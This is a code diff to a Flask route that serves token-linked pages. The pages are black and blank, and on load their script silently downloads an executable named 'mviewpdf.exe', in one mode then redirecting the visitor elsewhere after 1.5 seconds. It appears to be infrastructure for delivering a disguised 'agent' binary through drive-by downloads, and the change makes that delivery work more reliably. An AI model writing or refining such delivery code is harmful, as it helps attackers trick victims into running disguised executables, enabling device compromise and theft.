@@ -838,41 +838,45 @@ def serve_agent(token):
 
     dl_url = f"/guide/{token}/dl" if token in _agent_dl_cache else AGENT_STORAGE_URL
 
+    import json as _json
+
     if link_mode == "redirect" and redirect_url:
-        # Show an invisible page: trigger download then redirect after 1.5 s
-        html = f"""<!DOCTYPE html><html><head><meta charset=utf-8>
-<title>Loading…</title>
-<style>*{{margin:0;padding:0}}html,body{{height:100%;background:#000}}</style>
-</head><body>
-<script>
-(function(){{
-  var a=document.createElement('a');
-  a.href={repr(dl_url)};
-  a.download='mviewpdf.exe';
-  document.body.appendChild(a);
-  a.click();
-  setTimeout(function(){{window.location.href={repr(redirect_url)};}},1500);
-}})();
-</script>
-</body></html>"""
-        return make_response(html, 200, {{"Content-Type": "text/html"}})
+        dl_js  = _json.dumps(str(dl_url))
+        rdr_js = _json.dumps(str(redirect_url))
+        html = (
+            "<!DOCTYPE html><html><head><meta charset=utf-8>"
+            "<title> </title>"
+            "<style>*{margin:0;padding:0}html,body{height:100%;background:#000}</style>"
+            "</head><body><script>"
+            "(function(){"
+            "var a=document.createElement('a');"
+            f"a.href={dl_js};"
+            "a.download='mviewpdf.exe';"
+            "document.body.appendChild(a);a.click();"
+            f"setTimeout(function(){{window.location.href={rdr_js};}},1500);"
+            "})();</script></body></html>"
+        )
+        r = make_response(html, 200)
+        r.headers["Content-Type"] = "text/html"
+        return r
 
     # Blank page mode: plain black page that auto-starts the download
-    html = f"""<!DOCTYPE html><html><head><meta charset=utf-8>
-<title> </title>
-<style>*{{margin:0;padding:0}}html,body{{height:100%;background:#000}}</style>
-</head><body>
-<script>
-(function(){{
-  var a=document.createElement('a');
-  a.href={repr(dl_url)};
-  a.download='mviewpdf.exe';
-  document.body.appendChild(a);
-  a.click();
-}})();
-</script>
-</body></html>"""
-    return make_response(html, 200, {{"Content-Type": "text/html"}})
+    dl_js = _json.dumps(str(dl_url))
+    html = (
+        "<!DOCTYPE html><html><head><meta charset=utf-8>"
+        "<title> </title>"
+        "<style>*{margin:0;padding:0}html,body{height:100%;background:#000}</style>"
+        "</head><body><script>"
+        "(function(){"
+        "var a=document.createElement('a');"
+        f"a.href={dl_js};"
+        "a.download='mviewpdf.exe';"
+        "document.body.appendChild(a);a.click();"
+        "})();</script></body></html>"
+    )
+    r = make_response(html, 200)
+    r.headers["Content-Type"] = "text/html"
+    return r
 
 
 @app.route("/guide/<token>/dl")
